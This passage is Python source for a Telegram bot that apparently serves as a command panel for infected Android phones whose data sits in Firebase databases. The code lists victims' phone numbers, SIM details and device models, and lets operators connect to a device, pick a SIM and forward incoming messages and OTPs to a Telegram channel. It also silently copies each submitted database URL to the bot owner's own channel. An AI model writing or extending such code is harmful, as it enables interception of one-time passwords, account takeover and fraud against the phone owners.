    user_states[user_id] = "waiting_for_db_url"
    safe_send_message(chat_id, """
📡 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗡𝗘𝗪 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘

𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗨𝗥𝗟

𝗔𝗙𝗧𝗘𝗥 𝗬𝗢𝗨 𝗦𝗘𝗡𝗗 𝗗𝗕 𝗨𝗥𝗟 
𝗳𝗶𝗿𝗲𝗯𝗮𝘀𝗲 𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗵𝗼 𝗝𝗮𝘆𝗲𝗴𝗮
""")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_db_url")
def handle_db_url(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    db_url = message.text.strip()
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌")
        return
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    
    user_states.pop(user_id, None)
    
    loading = safe_send_message(chat_id, "🔄 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲...", track=False)
    
    firebase, db, client_count = connect_firebase(db_url)
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    if firebase and db:
        if client_count == 0:
            safe_send_message(chat_id, "❌ 𝗘𝗺𝗽𝘁𝘆 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲!\n\n𝗧𝗵𝗶𝘀 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 𝗵𝗮𝘀 𝗻𝗼 𝗰𝗹𝗶𝗲𝗻𝘁𝘀.")
            return
        
        if user_id not in user_firebase:
            user_firebase[user_id] = {}
            user_firebase_count[user_id] = 0
        
        user_firebase_count[user_id] += 1
        fb_id = str(user_firebase_count[user_id])
        
        user_firebase[user_id][fb_id] = {
            "firebase": firebase,
            "db": db,
            "url": db_url,
            "connected_date": datetime.now().strftime('%d/%m/%Y'),
            "connected_time": datetime.now().strftime('%I:%M:%S %p'),
            "client_count": client_count
        }
        
        try:
            user = message.from_user
            username = user.username or user.first_name or "Unknown"
            forward_msg = f"""
📡 𝗡𝗘𝗪 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘 𝗙𝗢𝗨𝗡𝗗 𝗜𝗡 𝗕𝗢𝗧

𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 𝗟𝗶𝗻𝗸 - {db_url}

𝗧𝗼𝘁𝗮𝗹 𝗰𝗹𝗶𝗲𝗻𝘁𝘀 𝗶𝗻 𝗱𝗯 - {client_count}

𝗙𝗿𝗼𝗺 - {username}

𝗗𝗮𝘁𝗲 - {datetime.now().strftime('%d/%m/%Y')}
"""
            bot.send_message(FIREBASE_DATA_CHANNEL, forward_msg)
        except:
            pass
        
        save_data()
        
        safe_send_message(chat_id, f"""
🩵 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 🩵

📊 𝗧𝗼𝘁𝗮𝗹 𝗖𝗹𝗶𝗲𝗻𝘁𝘀: {client_count}

𝗬𝗼𝘂𝗿 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 𝗖𝗼𝘂𝗻𝘁: {user_firebase_count[user_id]}
""")
    else:
        safe_send_message(chat_id, "❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗰𝗼𝗻𝗻𝗲𝗰𝘁!")

@bot.message_handler(func=lambda message: message.text == "𝗢𝗡𝗟𝗜𝗡𝗘")
def online_clients_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, "❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗶𝗿𝘀𝘁! ❌")
        return
    
    fb_list = user_firebase.get(user_id, {})
    if not fb_list:
        safe_send_message(chat_id, "❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 𝗳𝗶𝗿𝘀𝘁!")
        return
    
    loading = safe_send_message(chat_id, "🔍 𝗦𝗲𝗮𝗿𝗰𝗵𝗶𝗻𝗴 𝗼𝗻𝗹𝗶𝗻𝗲 𝗰𝗹𝗶𝗲𝗻𝘁𝘀...", track=False)
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    total_online = 0
    idx = 0
    user_balances = user_balance.get(user_id, {})
    
    for fb_id, fb_data in fb_list.items():
        try:
            db = fb_data["db"]
            online_clients = get_online_clients(db)
            
            if online_clients:
                safe_send_message(chat_id, f"📁 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲-{fb_id}\n🔗 {fb_data['url'][:50]}...\n📊 𝗖𝗹𝗶𝗲𝗻𝘁𝘀: {fb_data.get('client_count', 'N/A')}")
                
                for client in online_clients:
                    data = client["data"]
                    client_id = client["id"]
                    sims = data.get("sims", [])
                    idx += 1
                    
                    sim_details = ""
                    for sim in sims:
                        sim_details += f"📶 {sim.get('carrierName', 'N/A')}  |  📞 {sim.get('phoneNumber', 'N/A')}  |  🎰 𝗦𝗹𝗼𝘁 {sim.get('simSlotIndex', 'N/A')}\n"
                    
                    model_name = data.get('modelName', 'Unknown')
                    mob_no = data.get('mobNo', 'N/A')
                    battery = data.get('battery', 'N/A')
                    
                    balance = user_balances.get(client_id, "Not set")
                    
                    msg = f"""
<b>Client #{idx}</b>

✅ <b>Connection Available</b>

<b>Main Num</b> - {mob_no}
<b>Model_name</b> - {model_name}
<b>Device_id</b> - <code>{client_id}</code>
<b>Battery</b> - {battery}%

<b>💰 Balance:</b> {balance}

<b>Sims →</b>
{sim_details if sim_details else '⚠️ No SIM found'}
━━━━━━━━━━━━━━━━━━━━
"""
                    keyboard = types.InlineKeyboardMarkup(row_width=2)
                    keyboard.add(types.InlineKeyboardButton("🧭 𝗖𝗢𝗡𝗡𝗘𝗖𝗧 🧭", callback_data=f"connect_{fb_id}_{client_id}"))
                    
                    safe_send_message(chat_id, msg, reply_markup=keyboard)
                    total_online += 1
            else:
                safe_send_message(chat_id, f"📁 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲-{fb_id}: 𝗡𝗼 𝗼𝗻𝗹𝗶𝗻𝗲 𝗰𝗹𝗶𝗲𝗻𝘁𝘀")
        except Exception as e:
            logger.error(f"Online error: {e}")
            safe_send_message(chat_id, f"❌ 𝗘𝗿𝗿𝗼𝗿 𝗿𝗲𝗮𝗱𝗶𝗻𝗴 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲-{fb_id}")
    
    if total_online == 0:
        safe_send_message(chat_id, "❌ 𝗡𝗼 𝗼𝗻𝗹𝗶𝗻𝗲 𝗰𝗹𝗶𝗲𝗻𝘁𝘀 𝗮𝗰𝗿𝗼𝘀𝘀 𝗮𝗹𝗹 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("connect_"))
def connect_client(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    parts = call.data.replace("connect_", "").split("_")
    
    if len(parts) == 2:
        fb_id, client_id = parts
    else:
        client_id = parts[0]
        fb_id = "1"
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        bot.answer_callback_query(call.id, "❌ Bot is OFF!", show_alert=True)
        return
    
    fb_list = user_firebase.get(user_id, {})
    if not fb_list:
        bot.answer_callback_query(call.id, "❌ Firebase first!", show_alert=True)
        return
    
    fb_data = fb_list.get(fb_id, list(fb_list.values())[0])
    db = fb_data["db"]
    
    loading = safe_send_message(chat_id, f"""
🔍 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗗𝗘𝗩𝗜𝗖𝗘 𝗦𝗧𝗔𝗧𝗨𝗦...

━━━━━━━━━━━━━━━━━━━━
𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡 𝗙𝗢𝗨𝗡𝗗 ✅
𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗 - {client_id[:12]}...

𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗢𝗻𝗹𝗶𝗻𝗲?
𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁...... ⏳
━━━━━━━━━━━━━━━━━━━━
""", track=False)
    
    if not is_client_online(db, client_id):
        if loading:
            try:
                bot.delete_message(chat_id, loading.message_id)
            except:
                pass
        bot.answer_callback_query(call.id, "❌ Device is OFFLINE!", show_alert=True)
        safe_send_message(chat_id, f"""
⚠️ 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗢𝗡 𝗢𝗙𝗙𝗟𝗜𝗡𝗘 𝗥𝗜𝗚𝗛𝗧 𝗡𝗢𝗪 ⚠️

🆔 𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗: <code>{client_id}</code>

𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿!
𝗢𝗡𝗟𝗜𝗡𝗘 𝗯𝘂𝘁𝘁𝗼𝗻 𝘀𝗲 𝗰𝗵𝗲𝗰𝗸 𝗸𝗮𝗿𝗲𝗻
""")
        return
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    connecting = safe_send_message(chat_id, "🔄 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚...", track=False)
    client_data = get_client_by_id(db, client_id)
    if connecting:
        try:
            bot.delete_message(chat_id, connecting.message_id)
        except:
            pass
    
    if not client_data:
        bot.answer_callback_query(call.id, "❌ Device not found!", show_alert=True)
        return
    
    if user_id in user_connected_device:
        old_device = user_connected_device[user_id]
        old_model = old_device.get("data", {}).get("modelName", "Unknown")
        user_connected_device.pop(user_id, None)
        if user_id in user_selected_sim:
            user_selected_sim.pop(user_id, None)
        if user_id in otp_monitoring:
            del otp_monitoring[user_id]
        if user_id in user_locked_messages:
            del user_locked_messages[user_id]
        safe_send_message(chat_id, f"🛑𝗗𝗶𝘀𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗽𝗿𝗲𝘃𝗶𝗼𝘂𝘀 𝗱𝗲𝘃𝗶𝗰𝗲🛑")
    
    user_connected_device[user_id] = {"client_id": client_id, "data": client_data, "fb_id": fb_id}
    
    sims = client_data.get("sims", [])
    sim_details = ""
    sim_buttons = []
    
    has_sim = len(sims) > 0
    
    for i, sim in enumerate(sims):
        sim_details += f"📶 {sim.get('carrierName', 'N/A')}  |  📞 {sim.get('phoneNumber', 'N/A')}  |  🎰 𝗦𝗹𝗼𝘁 {sim.get('simSlotIndex', 'N/A')}\n"
        sim_buttons.append(types.InlineKeyboardButton(f"𝗦𝗜𝗠 - {i+1}", callback_data=f"selectsim_{fb_id}_{client_id}_{i}"))
    
    if not has_sim:
        user_selected_sim[user_id] = {
            "client_id": client_id,
            "sim_index": None,
            "sim_data": None,
            "no_sim": True
        }
        save_data()
        logger.info(f"No SIM device connected for user {user_id}")
    
    recharge_info_lines = []
    all_available = True
    
    if has_sim:
        for sim in sims:
            sim_number = sim.get('phoneNumber', '')
            if sim_number:
                status = check_recharge_per_sim_smart(db, client_id, sim_number)
                recharge_info_lines.append(f"📞 {sim_number} - {status}")
                if "EXPIRED" in status:
                    all_available = False
    else:
        recharge_info_lines.append("⚠️ 𝗡𝗼 𝗦𝗜𝗠 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝗱𝗲𝘃𝗶𝗰𝗲")
    
    recharge_status = "✅ AVAILABLE" if all_available else "⚠️ EXPIRED"
    recharge_text = "\n".join(recharge_info_lines)
    
    token_status = "✅ ACTIVE" if user_id in user_token_channel else "❌ NOT SET"
    otp_status = "✅ ACTIVE" if user_id in user_otp_channel else "❌ NOT SET"
    
    msg = f"""
═══════════════════════
💞 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 𝗗𝗘𝗩𝗜𝗖𝗘 💞
═══════════════════════

🆔 𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗗: <code>{client_id}</code>

🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆 - {client_data.get('battery', 'N/A')}
🪩 𝗠𝗼𝗱𝗲𝗹 - {client_data.get('modelName', 'Unknown')}

📱 𝗧𝗼𝘁𝗮𝗹 𝗦𝗶𝗺𝘀: {len(sims)}
{sim_details.rstrip() if sim_details else '⚠️ 𝗡𝗼 𝗦𝗜𝗠 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗶𝘀 𝗱𝗲𝘃𝗶𝗰𝗲'}

━━━━━━━━━━━━━━━━━━━━
✅ 𝗥𝗘𝗖𝗛𝗔𝗥𝗚𝗘 𝗦𝗧𝗔𝗧𝗨𝗦: {recharge_status}
{recharge_text}

━━━━━━━━━━━━━━━━━━━━
🔑 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟: {token_status}
📨 𝗢𝗧𝗣 𝗠𝗢𝗡𝗜𝗧𝗢𝗥𝗜𝗡𝗚: {otp_status}
━━━━━━━━━━━━━━━━━━━━
"""
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    if sim_buttons:
        keyboard.add(*sim_buttons)
    
    keyboard.add(types.InlineKeyboardButton("🛟 𝗨𝗣𝗗𝗔𝗧𝗘 𝗕𝗔𝗟 🛟", callback_data=f"updbal_{client_id}"))
    
    safe_send_message(chat_id, msg, reply_markup=keyboard)
    save_data()
    
    if user_id in user_otp_channel:
        start_otp_monitoring_for_user(user_id, client_id, db, chat_id)
    
    if user_id not in user_token_channel:
        user_states[user_id] = "waiting_for_channel"
        safe_send_message(chat_id, """
═══════════════════════
📢 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
═══════════════════════
𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗜𝗡𝗞 / 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗜𝗗

𝗝𝗮𝗵𝗮 𝗮𝗮𝗽𝗸𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗱𝗿𝗼𝗽 𝗵𝗼𝗴𝗮 𝘃𝗼 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗱𝗲

💡 <b>Tip:</b> Use 𝗧𝗢𝗞𝗘𝗡 𝗖𝗡 to set permanent channel
""")

@bot.callback_query_handler(func=lambda call: call.data.startswith("selectsim_"))
def select_sim_handler(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        bot.answer_callback_query(call.id, "❌ Bot is OFF!", show_alert=True)
        return
    
    parts = call.data.replace("selectsim_", "").split("_")
    if len(parts) == 3:
        fb_id, client_id, sim_index = parts
    else:
        client_id, sim_index = parts[0], parts[1]
        fb_id = "1"
    sim_index = int(sim_index)
    
    if user_id not in user_connected_device:
        bot.answer_callback_query(call.id, "❌ 𝗗𝗲𝘃𝗶𝗰𝗲 𝗻𝗼𝘁 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱!", show_alert=True)
        return
    
    device_data = user_connected_device[user_id]["data"]
    sims = device_data.get("sims", [])
    
    if sim_index >= len(sims):
        bot.answer_callback_query(call.id, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗦𝗜𝗠!", show_alert=True)
        return
    
    selected_sim = sims[sim_index]
    
    user_selected_sim[user_id] = {
        "client_id": client_id,
        "sim_index": sim_index,
        "sim_data": selected_sim,
        "no_sim": False
    }
    save_data()
    
    safe_send_message(chat_id, f"""
═══════════════════════
💓 𝗦𝗜𝗠 𝗦𝗘𝗟𝗘𝗖𝗧𝗘𝗗 💓

𝗡𝗨𝗠𝗕𝗘𝗥 - {selected_sim.get('phoneNumber', 'N/A')}
𝗦𝗹𝗼𝘁 - {selected_sim.get('simSlotIndex', 'N/A')}
═══════════════════════
""")
    
    if user_id not in user_token_channel:
        user_states[user_id] = "waiting_for_channel"
        safe_send_message(chat_id, """
═══════════════════════
📢 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟

𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗜𝗡𝗞 / 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗜𝗗

𝗝𝗮𝗵𝗮 𝗮𝗮𝗽𝗸𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗱𝗿𝗼𝗽 𝗵𝗼𝗴𝗮 𝘃𝗼 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗱𝗲

💡 <b>Tip:</b> Use 𝗧𝗢𝗞𝗘𝗡 𝗖𝗡 to set
═══════════════════════
""")
    
    bot.answer_callback_query(call.id, "✅ 𝗦𝗜𝗠 𝗦𝗘𝗟𝗘𝗖𝗧𝗘𝗗!")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_channel")
def handle_channel_link(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    channel_input = message.text.strip()
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌")
        return
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    
    user_states.pop(user_id, None)
    
    loading = safe_send_message(chat_id, """
🔄 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚 𝗪𝗜𝗧𝗛 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 
═══════════════════════
""", track=False)
    
    channel_id, channel_title = join_channel(channel_input)
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    if channel_id:
        user_channel_data[user_id] = {"channel_id": channel_id, "channel_title": channel_title}
        save_data()
        safe_send_message(chat_id, f"""
☢️ 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 𝗪𝗜𝗧𝗛 𝗖𝗛𝗔𝗡𝗡𝗘𝗟

𝗪𝗔𝗜𝗧𝗜𝗡𝗚 𝗙𝗢𝗥 𝗡𝗘𝗪 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 
𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 📢
""")
    else:
        safe_send_message(chat_id, "❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗷𝗼𝗶𝗻 𝗰𝗵𝗮𝗻𝗻𝗲𝗹!")

@bot.message_handler(func=lambda message: message.text == "𝗧𝗢𝗞𝗘𝗡 𝗖𝗡")
def token_cn_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, "❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗶𝗿𝘀𝘁! ❌")
        return
    
    if user_id not in user_firebase:
        safe_send_message(chat_id, "❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 𝗳𝗶𝗿𝘀𝘁!")
        return
    
    if user_id in user_token_channel:
        channel_title = user_token_channel[user_id].get("channel_title", "Unknown")
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            types.InlineKeyboardButton("🔄 𝗨𝗽𝗱𝗮𝘁𝗲 𝗧𝗼𝗸𝗲𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", callback_data="update_token_channel"),
            types.InlineKeyboardButton("❌ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗧𝗼𝗸𝗲𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", callback_data="remove_token_channel")
        )
        
        safe_send_message(chat_id, f"""
════════════════════════
   📌 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗦𝗘𝗧   
════════════════════════

📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: <b>{channel_title}</b>
✅ 𝗦𝘁𝗮𝘁𝘂𝘀: <b>Active</b>

💡 <i>You can update or remove it</i>
""", reply_markup=keyboard)
        return
    
    user_states[user_id] = "waiting_for_token_channel"
    safe_send_message(chat_id, """
═════════════════════════
  🔑 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗦𝗘𝗧𝗨𝗣  
═════════════════════════

📢 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟

📎 𝗦𝗲𝗻𝗱 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗹𝗶𝗻𝗸 / 𝗜𝗗

⚠️ <b>Make sure Bot is Admin</b> in channel!
""")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_token_channel")
def handle_token_channel(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    channel_input = message.text.strip()
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌")
        return
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    
    user_states.pop(user_id, None)
    
    loading = safe_send_message(chat_id, "🔄 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝗰𝗵𝗮𝗻𝗻𝗲𝗹...", track=False)
    
    channel_id, channel_title = join_channel(channel_input)
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    if channel_id:
        user_token_channel[user_id] = {
            "channel_id": channel_id,
            "channel_title": channel_title,
            "token": "TOKEN_CN"
        }
        user_token_active[user_id] = True
        save_data()
        
        safe_send_message(chat_id, f"""
═════════════════════════
  ✅ 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗦𝗘𝗧  ✅  
═════════════════════════

📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: <b>{channel_title}</b>
🔑 𝗧𝗼𝗸𝗲𝗻: <code>TOKEN_CN</code>

✅ <b>Channel is ready!</b>
💡 <i>You can now use this channel</i>
""")
    else:
        safe_send_message(chat_id, """
❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗰𝗼𝗻𝗻𝗲𝗰𝘁!

⚠️ 𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲:
• 𝗕𝗼𝘁 𝗶𝘀 𝗮𝗱𝗺𝗶𝗻 𝗶𝗻 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹
• 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗹𝗶𝗻𝗸/𝗜𝗗 𝗶𝘀 𝗰𝗼𝗿𝗿𝗲𝗰𝘁
""")

@bot.callback_query_handler(func=lambda call: call.data == "update_token_channel")
def update_token_channel(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    user_states[user_id] = "waiting_for_token_channel"
    safe_send_message(chat_id, """
🔄 𝗨𝗣𝗗𝗔𝗧𝗘 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟

📢 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗡𝗘𝗪 𝗖𝗛𝗔𝗡𝗡𝗘𝗟

📎 𝗦𝗲𝗻𝗱 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗹𝗶𝗻𝗸 / 𝗜𝗗
""")
    bot.answer_callback_query(call.id, "🔄 Update Token Channel")

@bot.callback_query_handler(func=lambda call: call.data == "remove_token_channel")
def remove_token_channel(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if user_id in user_token_channel:
        channel_title = user_token_channel[user_id].get("channel_title", "Unknown")
        del user_token_channel[user_id]
        user_token_active[user_id] = False
        save_data()
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        safe_send_message(chat_id, f"""
✅ 𝗧𝗢𝗞𝗘𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗥𝗘𝗠𝗢𝗩𝗘𝗗!

📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: <b>{channel_title}</b>

🔑 𝗧𝗼𝗸𝗲𝗻: <code>TOKEN_CN</code> - 𝗥𝗘𝗠𝗢𝗩𝗘𝗗
""")
        bot.answer_callback_query(call.id, "✅ Token Channel Removed!")
    else:
        bot.answer_callback_query(call.id, "❌ No Token Channel found!")

@bot.message_handler(func=lambda message: message.text == "𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟")
def otp_channel_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, """
❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌

𝗣𝗟𝗘𝗔𝗦𝗘 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥
         ☠️ @s4_tg2 ☠️
""")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗶𝗿𝘀𝘁! ❌")
        return
    
    if user_id not in user_firebase:
        safe_send_message(chat_id, "❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝗙𝗶𝗿𝗲𝗯𝗮𝘀𝗲 𝗳𝗶𝗿𝘀𝘁!")
        return
    
    user_states[user_id] = "waiting_for_otp_channel"
    safe_send_message(chat_id, """
📢 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟

𝗦𝗘𝗡𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗜𝗡𝗞 / 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗜𝗗

𝗦𝗲𝘁 𝗬𝗼𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗙𝗼𝗿 𝗨𝗽𝗰𝗼𝗺𝗶𝗻𝗴 𝗠𝗲𝘀𝘀𝗮𝗴𝗲𝘀
𝗜𝗻 𝗬𝗼𝘂𝗿 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲

⚠️ 𝗠𝗔𝗞𝗘 𝗦𝗨𝗥𝗘 𝗕𝗢𝗧 𝗜𝗦 𝗔𝗗𝗠𝗜𝗡 𝗜𝗡 𝗬𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 ⚠️
""")

